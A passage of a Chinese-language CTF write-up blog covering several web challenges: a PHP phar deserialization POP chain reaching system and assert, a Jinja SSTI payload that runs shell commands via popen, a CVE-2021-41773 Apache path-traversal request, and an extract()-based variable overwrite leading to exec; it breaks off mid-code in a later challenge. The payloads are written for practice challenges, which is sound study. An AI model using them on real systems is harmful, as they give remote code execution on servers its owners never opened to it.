class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;eval&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="keyword">new</span> <span class="title function_ invoke__">xx</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//此功能废弃，不想写了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$z</span>=<span class="keyword">new</span> <span class="title function_ invoke__">zz</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ff</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$z</span>;</span><br><span class="line"><span class="variable">$z</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa::__destruct() -&gt; zz::__toString() -&gt; zz::write() -&gt; ff:__get() -&gt; xx::__call()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205105221482.png" alt="image-20241205105221482"></p><h2 id="HNCTF-2022-WEEK3-ssssti"><a href="#HNCTF-2022-WEEK3-ssssti" class="headerlink" title="[HNCTF 2022 WEEK3]ssssti"></a>[HNCTF 2022 WEEK3]ssssti</h2><p>这里直接给出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat flag</span><br></pre></td></tr></table></figure><h2 id="GFCTF-2021-Baby-Web"><a href="#GFCTF-2021-Baby-Web" class="headerlink" title="[GFCTF 2021]Baby_Web"></a>[GFCTF 2021]Baby_Web</h2><p>打开后没什么利用点，源码中说了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;</span><br></pre></td></tr></table></figure><p>又试了试目录穿越，不行啊。</p><p>扫扫目录看看</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184800886.png" alt="image-20241205184800886" style="zoom:80%;" /><p>中间有一个&#x2F;etc&#x2F;passwd的神奇东西，试试</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184816327.png" alt="image-20241205184816327" style="zoom: 67%;" /><p>我勒个任意文件读取</p><p>此处其实是一个CVE-2021-41773</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27; -d &#x27;A=|echo;id&#x27;</span><br></pre></td></tr></table></figure><p>poc执行不了，没办法，正常打吧</p><p>读取一下上层目录的index.php.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Temp</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205185132883.png" alt="image-20241205185132883"></p><p>不让我读？？！！</p><p>为啥啊，试试之前的.txt格式，可以了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">Class Temp&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);<span class="comment">//action=list module=$mod</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">            <span class="variable">$var</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; </span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="variable">$n</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先</p><p>new Temp时会对this-&gt;date赋值，然后进入display()方法后发现有一个extract($this-&gt;date);，这可以进行变量覆盖，看后面$this-&gt;getTempName($template,$space);，跟进后发现$dir需要为admin，那么我们变量覆盖即可，POST一个space&#x3D;admin，接着看后面if(!is_file($this-&gt;template))，让GET ?file&#x3D;index.html即可。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205190842283.png" alt="image-20241205190842283" style="zoom:80%;" /><p>然后此处include了这串php代码，调用了listdata方法，传参action&#x3D;list module&#x3D;$mod</p><p>这里只有$mod时可控的。</p><blockquote><p>action&#x3D;list&amp;module&#x3D;$mod</p><p>mod&#x3D;xxx action&#x3D;function </p><p>action&#x3D;list module&#x3D;xxx action&#x3D;function  force&#x3D;false name&#x3D;phpinfo()</p></blockquote><p>这里后面传入的action把前面的list覆盖掉就可以了，用function来覆盖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=phpinfo</span><br></pre></td></tr></table></figure><p>在phpinfo里面可以找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;45956a8b-37e3-43e1-9ec0-664239b74a90&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=exec param=tac$&#123;IFS&#125;/f11111111aaaagggg&gt;1.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205195913384.png" alt="image-20241205195913384"></p><h2 id="羊城杯-2020-easyphp"><a href="#羊城杯-2020-easyphp" class="headerlink" title="[羊城杯 2020]easyphp"></a>[羊城杯 2020]easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span 